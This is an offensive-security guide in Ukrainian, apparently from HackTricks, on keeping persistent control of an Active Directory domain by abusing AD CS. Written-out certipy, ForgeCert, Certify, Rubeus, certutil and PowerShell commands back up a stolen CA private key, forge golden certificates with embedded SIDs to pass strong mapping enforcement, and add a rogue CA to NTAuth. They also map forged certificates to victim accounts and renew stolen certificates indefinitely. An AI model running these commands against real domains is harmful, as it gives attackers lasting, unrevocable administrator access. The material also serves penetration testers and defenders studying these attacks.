# Персистентність AD CS у домені

{{#include ../../../banners/hacktricks-training.md}}

**Це стислий виклад технік персистентності в домені, наведених у [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Перегляньте документ для детальнішої інформації.

## Підробка сертифікатів з використанням вкрадених сертифікатів CA (Golden Certificate) - DPERSIST1

Як визначити, що сертифікат є сертифікатом CA?

Можна визначити, що сертифікат є сертифікатом CA, якщо виконуються кілька умов:

- Сертифікат збережено на CA-сервері, а його приватний ключ захищено за допомогою DPAPI машини або апаратно (TPM/HSM), якщо ОС це підтримує.
- Поля Issuer та Subject сертифіката збігаються з distinguished name CA.
- Розширення "CA Version" присутнє виключно в сертифікатах CA.
- Сертифікат позбавлений полів Extended Key Usage (EKU).

Щоб отримати приватний ключ цього сертифіката, підтримуваним способом через вбудований графічний інтерфейс є інструмент `certsrv.msc` на CA-сервері. Тим не менш, цей сертифікат не відрізняється від інших, що зберігаються в системі; отже, для вилучення можна застосувати такі методи, як [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Сертифікат і приватний ключ також можна отримати за допомогою Certipy, використавши наступну команду:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Після отримання сертифіката CA та його приватного ключа у форматі `.pfx`, такі інструменти як [ForgeCert](https://github.com/GhostPack/ForgeCert) можна використати для генерації дійсних сертифікатів:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Користувач, на якого спрямовано підробку сертифіката, має бути активним і здатним автентифікуватися в Active Directory, щоб процес пройшов успішно. Підробка сертифіката для спеціальних облікових записів, таких як krbtgt, неефективна.

Цей підроблений сертифікат буде **дійсним** до вказаної дати завершення і поки **кореневий сертифікат CA дійсний** (зазвичай від 5 до **10+ років**). Він також дійсний для **машин**, тому в поєднанні з **S4U2Self** нападник може **підтримувати персистенцію на будь-якій доменній машині** настільки, наскільки дійсний сертифікат CA.\
Крім того, **сертифікати, згенеровані** цим методом **не можуть бути відкликані**, оскільки CA про них не знає.

### Робота під Strong Certificate Mapping Enforcement (2025+)

З 11 лютого 2025 року (після розгортання KB5014754) доменні контролери за замовчуванням переходять у режим **Full Enforcement** для відображень сертифікатів. Практично це означає, що ваші підроблені сертифікати повинні або:

- Містити сильну прив'язку до цільового облікового запису (наприклад, SID security extension), або
- Бути поєднані з сильною, явною прив'язкою в атрибуті `altSecurityIdentities` цільового об'єкта.

Надійний підхід для забезпечення персистенції — виготовити підроблений сертифікат, підпорядкований вкраденому Enterprise CA, а потім додати сильне явне відображення для принципалу-жертви:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Примітки
- Якщо ви можете створювати підроблені сертифікати, що містять SID security extension, вони відображатимуться неявно навіть за Full Enforcement. В іншому випадку віддавайте перевагу явним сильним відображенням. Див. [account-persistence](account-persistence.md) для детальнішої інформації про явні відображення.
- Відкликання не допомагає захисникам тут: підроблені сертифікати невідомі CA database і тому не можуть бути відкликані.

#### Full-Enforcement compatible forging (SID-aware)

Оновлені інструменти дозволяють безпосередньо вбудовувати SID, зберігаючи golden certificates придатними навіть коли DCs відхиляють weak mappings:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Вбудовуючи SID, ви уникаєте необхідності змінювати `altSecurityIdentities`, які можуть відстежуватися, при цьому все одно проходячи строгі перевірки відображення.

## Довіра підробленим CA Certificates - DPERSIST2

Об'єкт `NTAuthCertificates` визначено так, щоб містити один або кілька **CA certificates** у його атрибуті `cacertificate`, який використовує Active Directory (AD). Процес перевірки, що виконується **domain controller**, полягає в перевірці об'єкта `NTAuthCertificates` на наявність запису, що відповідає **CA specified** у Issuer field автентифікуючогося **certificate**. Якщо збіг знайдено, автентифікація продовжується.

Self-signed CA certificate може бути додано в об'єкт `NTAuthCertificates` атакуючим за умови, що він контролює цей AD-об'єкт. Зазвичай дозволи на зміну цього об'єкта мають лише члени групи **Enterprise Admin**, разом з **Domain Admins** або **Administrators** у **forest root’s domain**. Вони можуть редагувати об'єкт `NTAuthCertificates` за допомогою `certutil.exe` командою `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, або скориставшись [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Додаткові корисні команди для цієї техніки:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ця можливість особливо актуальна при використанні спільно з раніше описаним методом за участі ForgeCert для динамічного генерування сертифікатів.

> Роздуми щодо відображень після 2025 року: розміщення rogue CA в NTAuth встановлює довіру лише до видавця CA. Щоб використовувати leaf certificates для входу, коли DCs перебувають у **Full Enforcement**, leaf має або містити SID security extension, або має існувати сильне явне відображення на цільовому об'єкті (наприклад, Issuer+Serial в `altSecurityIdentities`). Див. {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Можливостей для **persistence** через модифікації security descriptor компонентів AD CS достатньо. Модифікації, описані в розділі "[Domain Escalation](domain-escalation.md)", можуть бути зловмисно реалізовані атакуючим з підвищеними правами. Це включає додавання "control rights" (наприклад, WriteOwner/WriteDACL/etc.) до чутливих компонентів, таких як:

- AD computer object сервера **CA**
- RPC/DCOM server сервера **CA**
- Будь-який **descendant AD object or container** у **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (наприклад, контейнер Certificate Templates, контейнер Certification Authorities, об'єкт `NTAuthCertificates` тощо)
- **AD groups delegated rights to control AD CS** за замовчуванням або організацією (наприклад, вбудована група `Cert Publishers` та будь-які її члени)

Приклад зловмисної реалізації: атакуючий з **elevated permissions** у домені додає право **`WriteOwner`** до шаблону сертифіката за замовчуванням **`User`**, призначаючи себе як principal для цього права. Щоб скористатися цим, атакуючий спочатку змінює власника шаблону **`User`** на себе. Після цього на шаблоні встановлюється прапорець **`mspki-certificate-name-flag`** зі значенням **1**, щоб увімкнути **`ENROLLEE_SUPPLIES_SUBJECT`**, що дозволяє користувачу вказати Subject Alternative Name у запиті. Надалі атакуючий може **enroll** за допомогою цього шаблону, обравши ім'я domain administrator як альтернативне ім'я, і використати отриманий сертифікат для автентифікації як DA.

Практичні налаштування, які атакуючі можуть встановити для довгострокової domain persistence (див. {{#ref}}domain-escalation.md{{#endref}} для повних деталей та виявлення):

- CA policy flags, що дозволяють SAN від запитувачів (наприклад, увімкнення `EDITF_ATTRIBUTESUBJECTALTNAME2`). Це зберігає експлуатованість шляхів на кшталт ESC1.
- Template DACL або налаштування, що дозволяють видачу, придатну для автентифікації (наприклад, додавання Client Authentication EKU, увімкнення `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Контроль над об'єктом `NTAuthCertificates` або контейнерами CA, щоб постійно повторно вводити rogue issuers у випадку, якщо захисники спробують очистити систему.

> [!TIP]
> В ускладнених середовищах після KB5014754 поєднання цих misconfigurations з явними сильними відображеннями (`altSecurityIdentities`) гарантує, що ваші видані або підроблені сертифікати залишаться придатними навіть коли DCs застосовують сильне відображення.

### Certificate renewal abuse (ESC14) for persistence

Якщо ви скомпрометували authentication-capable certificate (або Enrollment Agent), ви можете **renew** його безстроково, доки виданий шаблон залишається опублікованим і ваш CA все ще довіряє issuer chain. Renewal зберігає початкові bindings ідентичності, але продовжує термін дії, ускладнюючи eviction, якщо тільки шаблон не буде виправлено або CA не буде перевипущено.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Якщо контролери домену знаходяться в режимі **Full Enforcement**, додайте `-sid <victim SID>` (або використайте шаблон, який все ще містить розширення безпеки SID), щоб поновлений кінцевий сертифікат продовжував забезпечувати сильне відображення без змін `altSecurityIdentities`. Атакувальники з правами адміністратора CA також можуть підкоригувати `policy\RenewalValidityPeriodUnits`, щоб подовжити термін дії поновлених сертифікатів перед тим, як видати собі сертифікат.

## References

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
